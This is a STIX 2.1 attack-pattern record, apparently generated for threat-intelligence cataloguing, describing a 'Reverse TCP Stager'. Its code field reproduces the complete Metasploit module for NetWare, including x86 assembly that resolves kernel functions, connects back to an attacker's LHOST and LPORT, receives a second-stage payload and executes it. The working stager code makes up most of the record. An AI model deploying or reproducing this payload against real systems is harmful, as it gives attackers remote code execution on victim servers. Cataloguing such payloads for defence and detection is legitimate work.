{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a1b81e9e-6c32-4c2c-bd3e-a382132c5ac1",
    "created": "2024-08-14T16:33:19.471121Z",
    "modified": "2024-08-14T16:33:19.471125Z",
    "name": "Reverse TCP Stager",
    "description": "Connect back to the attacker",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stagers/netware/reverse_tcp.rb",
            "external_id": "reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasm'\n\nmodule MetasploitModule\n\n  CachedSize = 281\n\n  include Msf::Payload::Stager\n  include Msf::Payload::Netware\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Reverse TCP Stager',\n      'Description'   => 'Connect back to the attacker',\n      'Author'        => 'toto',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'netware',\n      'Arch'          => ARCH_X86,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Convention'    => 'sockesi',\n      'Stager'        =>\n        {\n          'Offsets' =>\n            {\n              'LHOST' => [ 0, 'ADDR' ],\n              'LPORT' => [ 0, 'n'    ],\n            },\n          'Assembly' => <<EOS\njmp main_code\n\n//\n// resolve a symbol address using the DebuggerSymbolHashTable\n// (could resolve only against function name for smaller code)\n//\n\nresolv_addr:\n  push edi\n  push ecx\n  xor edi, edi\nr_loop:\n  mov edx, [ebp+edi*4]\n  test edx, edx\n  jz  r_next\nr_loop2:\n  xor esi, esi\n  mov ebx, [edx+8]\n  mov al, byte ptr[ebx]\nr_iloop2:\n  test al, al\n  jz r_after2\n  inc ebx\n  movzx ecx, byte ptr[ebx]\n  ror esi, 0x0d\n  add esi, ecx\n  dec al\n  jmp r_iloop2\nr_after2:\n  cmp esi, [esp+0x0c]\n  jz r_found\n  mov edx, [edx]\n  test edx, edx\n  jnz r_loop2\nr_next:\n  inc edi\n  cmp edi, 0x200\n  jnz r_loop\n  jmp r_end\nr_found:\n  mov eax, [edx+4]\nr_end:\n  pop ecx\n  pop edi\n  ret\n\n\nmain_code:\n  // search DebuggerSymbolHashTable pointer using GDT system call gate\n  // -> points inside SERVER.NLM\n  cli\n  sub esp, 8\n  mov ecx, esp\n  sgdt [ecx]\n\n  cli\n  mov ebx, [ecx+2]\n\n  mov bp, word ptr [ebx+0x4E]\n  shl ebp, 16\n  mov bp, word ptr [ebx+0x48]\n\nf_finddebugger:\n  cmp dword ptr[ebp], 0\n  jnz f_next\n  cmp dword ptr[ebp+4], 0x808bc201\n  jz f_end\nf_next:\n  dec ebp\n  jmp f_finddebugger\nf_end:\n  mov ebp, [ebp-7]\n\n  // resolve function pointers\n  call current\ncurrent:\n  pop edi\n  add edi, (fct_ptrs - current)\n  mov cl, 6\nresolv_ptrs:\n  push [edi]\n  call resolv_addr\n  stosd\n  dec cl\n  test cl, cl\n  jnz resolv_ptrs\n\n  sti\n\n  // remove CIFS lock\n  call [edi-4]          // NSS.NLM|NSSMPK_UnlockNss\n\n  // allocate heap buffer to remove the code from the stack (if on the stack)\n  // network functions will give back control to the kernel and we don't want\n  // the driver to erase our shellcode\n\n  push 65535\n  call [edi-8]          ; AFPTCP.NLM|LB_malloc\n  mov ecx, (end_reverse - reverse_connect)\n  mov esi, edi\n  sub esi, ecx\n  mov edi, eax\n  test eax, eax\n  jz end\n\n  repe movsb\n  jmp eax\n\n\nreverse_connect:\n  xor ebx, ebx\n\n  push ebp\n  mov ebp, esp\n  push ebp\n  push ebx        // protocol\n  push 1          // SOCK_STREAM\n  push 2          // AF_INET\n  call [edi-0xc]       // LIBC.NLM|bsd_socket_mp\n  mov esi, eax\n  test eax, eax\n  jz end\n\n  push ebx\n  push ebx\n  push LHOST\n  push.i16 LPORT\n  push.i16 2\n  mov ecx, esp\n  push ebp\n  push 16\n  push ecx\n  push esi\n  call [edi-0x10]       // LIBC.NLM|bsd_connect_mp\n  cmp eax, -1\n  jz end\n\n  push 65535\n  push edi\n  mov ecx, esp\n\n  push ebx\n  push ebx\n  push ebx\n  inc ebx\n  push ebx\n  dec ebx\n  push ecx\n  push ebx\n  push ebx\n  mov ecx, esp\n\n  push ebp\n  push ebx\n  push ecx\n  push esi\n  call [edi-0x14]       // LIBC.NLM|bsd_recvmsg_mp\n\n  jmp edi\n\nend:\n  ; go back to the main kernel loop\n  call [edi-0x18]       // SERVER.NLM|kWorkerThread\n\nfct_ptrs:\n  dd 0x9294bdcb         // SERVER.NLM|kWorkerThread\n  dd 0x3605cc1c         // LIBC.NLM|bsd_recvmsg_mp\n  dd 0x19a75280         // LIBC.NLM|bsd_connect_mp\n  dd 0x46f23d88         // LIBC.NLM|bsd_socket_mp\n  dd 0x6877687c         // AFPTCP.NLM|LB_malloc\n  dd 0x8967f0ce         // NSS.NLM|NSSMPK_UnlockNss\nend_reverse:\n  nop\nEOS\n        }\n      ))\n  end\nend\n",
    "x_mitre_platforms": [
        "netware'"
    ]
}